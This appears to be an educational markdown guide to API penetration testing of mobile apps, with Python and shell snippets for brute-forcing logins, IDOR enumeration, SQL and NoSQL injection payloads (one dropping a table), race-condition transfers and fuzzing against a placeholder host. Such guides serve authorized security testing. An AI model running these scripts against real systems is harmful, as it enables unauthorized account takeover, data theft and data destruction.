# API Penetration Testing Guide for Mobile Applications

## Overview
This guide provides a comprehensive methodology for conducting API penetration testing on mobile applications. It covers various attack vectors, tools, and best practices.

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Authentication Testing](#authentication-testing)
3. [Authorization Testing](#authorization-testing)
4. [Input Validation](#input-validation)
5. [Business Logic Flaws](#business-logic-flaws)
6. [Data Exposure](#data-exposure)
7. [Rate Limiting and DoS](#rate-limiting-and-dos)
8. [API Fuzzing](#api-fuzzing)

---

## 1. Reconnaissance

### Objectives:
- Identify all API endpoints
- Map API structure and documentation
- Discover hidden/undocumented endpoints

### Tools:
- **Burp Suite**: Intercept and analyze API traffic
- **mitmproxy**: Man-in-the-middle proxy for mobile apps
- **Frida**: Dynamic instrumentation to hook API calls

### Techniques:
```bash
# Use Frida to intercept API calls
frida -U -f com.example.app -l api_interceptor.js

# Extract endpoints from decompiled APK
apktool d app.apk
grep -r "http" app/
```

---

## 2. Authentication Testing

### Common Vulnerabilities:
- Weak password policies
- Insecure token storage
- Missing authentication on sensitive endpoints
- Token reuse after logout

### Test Cases:
```python
# Test 1: Brute force protection
import requests

for i in range(1000):
    r = requests.post('https://api.example.com/login', 
                      json={'username': 'admin', 'password': f'pass{i}'})
    if r.status_code == 200:
        print(f"Password found: pass{i}")
        break

# Test 2: Token expiration
token = "expired_token_here"
headers = {"Authorization": f"Bearer {token}"}
r = requests.get('https://api.example.com/user/profile', headers=headers)
print(f"Response: {r.status_code}")  # Should be 401
```

---

## 3. Authorization Testing

### IDOR (Insecure Direct Object Reference):
```python
# Test accessing other users' data
user_ids = [1, 2, 3, 100, 999]
for uid in user_ids:
    r = requests.get(f'https://api.example.com/user/{uid}/profile',
                     headers={'Authorization': 'Bearer YOUR_TOKEN'})
    if r.status_code == 200:
        print(f"Access to user {uid}: {r.json()}")
```

### Privilege Escalation:
- Test role modifications
- Attempt admin endpoint access with regular user tokens

---

## 4. Input Validation

### SQL Injection:
```python
payloads = ["' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT * FROM passwords--"]

for payload in payloads:
    r = requests.post('https://api.example.com/search',
                      json={'query': payload})
    print(f"Payload: {payload} | Status: {r.status_code}")
```

### NoSQL Injection:
```python
# MongoDB injection example
payload = {"username": {"$ne": None}, "password": {"$ne": None}}
r = requests.post('https://api.example.com/login', json=payload)
```

### XSS in API Responses:
Test if API reflects user input without sanitization.

---

## 5. Business Logic Flaws

### Race Conditions:
```python
import threading

def transfer_money():
    requests.post('https://api.example.com/transfer',
                  json={'from': 'account1', 'to': 'account2', 'amount': 100})

# Execute simultaneously
threads = [threading.Thread(target=transfer_money) for _ in range(10)]
for t in threads:
    t.start()
```

### Parameter Tampering:
- Modify price fields in purchase requests
- Change quantity to negative values
- Alter user roles in profile updates

---

## 6. Data Exposure

### Sensitive Data in Responses:
- Check for passwords, tokens, or keys in API responses
- Verify PII is properly masked

### Excessive Data Exposure:
```python
r = requests.get('https://api.example.com/users')
data = r.json()
# Check if response contains unnecessary fields like SSN, passwords, etc.
```

---

## 7. Rate Limiting and DoS

### Test Rate Limiting:
```python
for i in range(1000):
    r = requests.post('https://api.example.com/login',
                      json={'username': 'test', 'password': 'test'})
    if r.status_code == 429:  # Too Many Requests
        print(f"Rate limit hit at request {i}")
        break
```

---

## 8. API Fuzzing

### Automated Fuzzing with FFuf:
```bash
ffuf -w wordlist.txt -u https://api.example.com/FUZZ -mc 200,301,302
```

### Custom Fuzzer:
```python
import random
import string

def fuzz_endpoint(url):
    for _ in range(100):
        payload = ''.join(random.choices(string.printable, k=50))
        r = requests.post(url, json={'input': payload})
        if r.status_code == 500:
            print(f"Server error with payload: {payload}")

fuzz_endpoint('https://api.example.com/process')
```

---

## Best Practices

1. **Always get authorization** before testing production APIs
2. **Document all findings** with proof-of-concept code
3. **Use a testing environment** when possible
4. **Follow responsible disclosure** for vulnerabilities found
5. **Stay within scope** of your engagement

---

## Reporting Template

### Vulnerability Report Structure:
```markdown
## Vulnerability: [Name]

**Severity**: Critical/High/Medium/Low

**Description**: [Detailed explanation]

**Steps to Reproduce**:
1. Step 1
2. Step 2
3. ...

**Impact**: [What an attacker can do]

**Remediation**: [How to fix]

**References**: [CVE, OWASP, etc.]
```

---

## Additional Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks API Pentesting](https://book.hacktricks.xyz/pentesting/pentesting-web/web-api-pentesting)

---

**Note**: This guide is for educational and authorized testing purposes only. Unauthorized testing is illegal.
